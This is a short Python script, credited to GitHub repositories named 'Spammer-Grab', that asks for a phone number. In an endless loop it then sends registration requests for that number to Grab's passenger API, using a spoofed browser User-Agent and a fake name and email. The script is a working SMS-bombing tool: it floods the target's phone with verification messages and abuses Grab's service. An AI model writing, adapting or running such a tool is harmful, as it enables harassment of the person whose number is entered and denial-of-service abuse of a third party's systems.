"""
DISCLAIMER
----------

This code is taken from # https://github.com/Noxturnix/Spammer-Grab #
Edited by # https://github.com/BitTheByte #


"""


import requests
import datetime
#import threading
#import time
def logger(out):
	outtext= "[{}] {}".format(datetime.datetime.now(),out)
	print outtext
_phone = raw_input("[!] Enter phone number: ")

def send():
	r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,
	 'countryCode': 'ID',
	 'name': 'test',
	 'email': 'mail1@mail.com',
	 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
	logger(r.content)

while(1):
	send()
	#time.sleep(1)
	#threading.Thread(target=send).start()
